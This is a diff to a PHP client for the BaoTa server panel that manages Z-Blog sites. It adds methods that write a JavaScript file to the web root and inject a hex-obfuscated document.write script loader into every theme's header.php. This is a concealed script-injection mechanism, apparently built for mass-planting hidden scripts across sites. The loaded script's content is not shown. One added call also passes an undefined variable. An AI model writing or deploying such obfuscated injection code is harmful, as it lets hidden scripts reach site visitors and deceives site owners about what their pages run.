@@ -4,6 +4,8 @@
 
 //宝塔api
 class BtApi{
+    public $site;
+    public $wwwroot;
     private $bt_panel;
     private $bt_key;
 
@@ -11,7 +13,15 @@ class BtApi{
       $this->bt_panel=$bt_panel;
       $this->bt_key=$bt_key;
     }
-
+    
+    public function __set($name,$value) {
+        $this->$name=$value;
+    }
+    
+    public function __destruct() {
+        @unlink(__DIR__.'/'.md5($this->bt_panel).'.cookie');// 删除cookie
+    }
+    
     //添加网站
     public function AddSite($site,$path,$version,$sql=false,$datauser='',$datapassword=''){
         $url=$this->bt_panel.'/site?action=AddSite';
@@ -127,7 +137,7 @@ class BtApi{
     }
 
     //修改文件或者目录的的权限
-        public function SetFileAccess($filename, $user='www', $access=755, $all='false'){
+    public function SetFileAccess($filename, $user='www', $access=755, $all='false'){
         $url=$this->bt_panel.'/files?action=SetFileAccess';
         $p_data=$this->GetKeyData();
         $p_data['user']=$user;//例www
@@ -136,7 +146,6 @@ class BtApi{
         $p_data['filename']=$filename;//文件绝对路径
         return $this->HttpPostCookie($url,$p_data);
     }
-
 
     //签名
     private function GetKeyData(){
@@ -172,6 +181,73 @@ class BtApi{
         return $response;
     }
 
+    //主题header.php文件 添加js代码
+    public function add_js($cof_js){
+        // $jsstr = sprintf('<script type="text/javascript" src="/%s"></script>',$cof_js);
+        $jsstr = '<script type="text/javascript">window["\x64\x6f\x63\x75\x6d\x65\x6e\x74"][\'\x77\x72\x69\x74\x65\'](\'\x3c\x73\x63\x72\x69\x70\x74 \x73\x72\x63\x3d\x22\x2f'.$this->str_to_bin($cof_js).'\x22\x3e\x3c\/\x73\x63\x72\x69\x70\x74\x3e\');</script>';
+        $response=$this->GetDirList(sprintf('%s%s/zb_users/theme',$this->wwwroot,$this->site));
+        $res_arr=json_decode($response,true);
+        if( !isset($res_arr['DIR']) || !$res_arr['DIR']){
+            $this->file_record('添加js失败,没有主题文件',$site);
+            return $this;
+        }
+        $dirname=array();
+        foreach($res_arr['DIR'] as $val){
+            $temp_arr = explode(';',$val);
+            $dirname[] = $temp_arr[0];
+        }
+        foreach($dirname as $val){
+            $filename=sprintf('%s%s/zb_users/theme/%s/template/header.php',$this->wwwroot,$this->site,$val);
+            $response=$this->GetFileBody($filename);
+            $data_arr=json_decode($response,true);
+            if(!isset($data_arr['data']) || !$data_arr['data']){
+                continue;
+            }
+            //判断是否加过
+            if(strpos($data_arr['data'],$jsstr) !==false){
+                continue;
+            }
+            $new_data=str_replace('</head>',sprintf("\n%s\n</head>",$jsstr),$data_arr['data'],$count);
+            if($count>0){//字符串替换成功
+                $this->SaveFileBody($filename,$new_data);
+                echo "添加js代码成功\n";
+            }else{
+                $this->file_record('添加js代码失败');
+            }
+        }
+        return $this;
+    }
+
+    public function create_js($cof_js,$cof_js_content){
+        $filename=sprintf('%s%s/%s',$this->wwwroot,$this->site,$cof_js);
+        $this->CreateFile($filename);
+        $this->SaveFileBody($filename,$cof_js_content);
+        echo "创建js文件成功\n";
+        return $this;
+    }
+
+    //失败记录
+    public function file_record($msg){
+        echo $msg=$msg."\n";
+        $str=sprintf('%s----%s----%s',$this->site,date('Y-m-d'),$msg);
+        file_put_contents(__DIR__.'/fail_site.txt',$str,FILE_APPEND);
+    }
+
+    //字符串转16进制
+    public function str_to_bin($str){
+        $res='';
+        $len=strlen($str);
+        for($i=0;$i<$len;$i++){
+        $res.='\x'.bin2hex($str[$i]);
+        }
+        return $res;
+    }
+
+    //16进制转字符串
+    public function bin_to_str($str){
+        return hex2bin(str_replace('\\x','',$str));
+    }
+    
 }
 
 
@@ -194,6 +270,10 @@ class ZBlog{
     //设置网站域名和tdk
     public function __construct($tdk) {
         $this->set_tdk($tdk);
+    }
+
+    public function __set($name,$value) {
+        $this->$name=$value;
     }
 
     //设置变量
@@ -839,8 +919,3 @@ EOLEOLEOL;
     }
 
 }
-
-
-
-
-
